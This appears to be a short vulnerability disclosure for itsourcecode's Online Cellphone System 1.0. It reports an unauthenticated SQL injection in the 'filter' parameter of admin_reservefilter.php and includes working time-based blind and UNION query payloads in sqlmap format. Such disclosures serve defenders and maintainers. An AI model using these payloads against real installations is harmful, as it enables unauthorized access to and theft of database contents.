# Vendor

itsourcecode

# Product

Online Cellphone System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2019/04/cp.zip

# Description

The "admin_reservefilter.php" page is an interface that does not require authentication and can be accessed directly. This interface can pass in the filter parameter, which, due to non-standard filtering, leads to SQL injection.
<img width="1109" alt="image" src="https://github.com/user-attachments/assets/afdbd93a-ea69-467b-b7b2-9cffb8dff7e3">

# PoC
```
Parameter: filter (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: filter=123' AND (SELECT 8516 FROM (SELECT(SLEEP(5)))dycH) AND 'MdLi'='MdLi

    Type: UNION query
    Title: Generic UNION query (NULL) - 16 columns
    Payload: filter=123' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a7a7071,0x6f756d71724e59575642645650735a71536b63695849675876417571534c666f4e75557775797373,0x716b716a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
```
